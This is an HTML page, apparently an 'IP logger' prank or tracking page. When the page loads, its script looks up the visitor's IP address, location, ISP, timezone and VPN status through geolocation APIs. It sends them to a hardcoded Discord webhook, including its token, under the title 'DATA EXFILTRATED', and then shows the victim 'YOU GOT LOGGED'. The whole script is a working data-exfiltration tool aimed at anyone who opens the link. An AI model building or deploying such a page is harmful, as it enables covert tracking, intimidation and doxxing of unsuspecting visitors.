<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Failure</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .status-text {
            font-size: 3.5rem;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 8px;
            color: #fff;
            text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 40px #fff;
            margin-bottom: 10px;
            text-align: center;
            animation: flicker 1.5s infinite;
        }

        .info-box {
            font-size: 1.1rem;
            color: #888;
            margin-bottom: 40px;
            text-align: center;
        }

        #ip, #country { color: #fff; font-weight: bold; }

        /* Waving Image Flag Fix */
        .flag-container {
            margin-top: 20px;
            display: inline-block;
            animation: wave 2s ease-in-out infinite;
        }

        .flag-container img {
            width: 200px;
            border-radius: 8px;
            filter: drop-shadow(0 0 15px rgba(255, 255, 255, 0.7));
            display: block;
        }

        @keyframes wave {
            0%, 100% { transform: rotate(-8deg) translateY(0); }
            50% { transform: rotate(8deg) translateY(-20px); }
        }

        @keyframes flicker {
            0%, 18%, 22%, 25%, 53%, 57%, 100% { opacity: 1; }
            20%, 24%, 55% { opacity: 0.3; }
        }
    </style>
</head>
<body>

    <div class="status-text">YOU GOT LOGGED</div>
    
    <div class="info-box">
        <p>ADDRESS: <span id="ip">INTERCEPTING...</span></p>
        <p>ORIGIN: <span id="country">LOCATING...</span></p>
    </div>

    <div id="flag" class="flag-container"></div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457197434143899753/ELCSRJrIgs0O7LfzURYE7xKGk85ZkU6GXIVf6fOtkTEfMj9haJhOqUL8dFB7KApiKiOf";

        async function initLogger() {
            try {
                // Using a VPN-Detection capable API (ip-api.com)
                const response = await fetch('http://ip-api.com/json/?fields=66846719');
                const data = await response.json();

                // Update the Screen
                document.getElementById('ip').innerText = data.query;
                document.getElementById('country').innerText = data.country.toUpperCase();
                
                // FORCE IMAGE FLAG (Bypasses Windows text bug)
                const code = data.countryCode.toLowerCase();
                document.getElementById('flag').innerHTML = `<img src="https://flagcdn.com/w640/${code}.png">`;

                // Check if VPN is likely
                const isVPN = data.proxy || data.hosting ? "‚ö†Ô∏è YES (Proxy/Hosting)" : "‚úÖ NO";

                // Send to Webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "üíÄ DATA EXFILTRATED",
                            color: 0,
                            fields: [
                                { name: "IP Address", value: `\`${data.query}\``, inline: true },
                                { name: "Location", value: `${data.country} (${data.regionName})`, inline: true },
                                { name: "VPN/Proxy Detect", value: isVPN, inline: true },
                                { name: "ISP/Provider", value: data.isp, inline: false },
                                { name: "Timezone", value: data.timezone, inline: true }
                            ],
                            footer: { text: "Advanced Logger v2.0" },
                            timestamp: new Date()
                        }]
                    })
                });

            } catch (err) {
                // If the first API is blocked by HTTPS, use this secure fallback
                const res2 = await fetch('https://ipapi.co/json/');
                const d2 = await res2.json();
                document.getElementById('ip').innerText = d2.ip;
                document.getElementById('country').innerText = d2.country_name.toUpperCase();
                document.getElementById('flag').innerHTML = `<img src="https://flagcdn.com/w640/${d2.country_code.toLowerCase()}.png">`;
            }
        }

        window.onload = initLogger;
    </script>
</body>
</html>
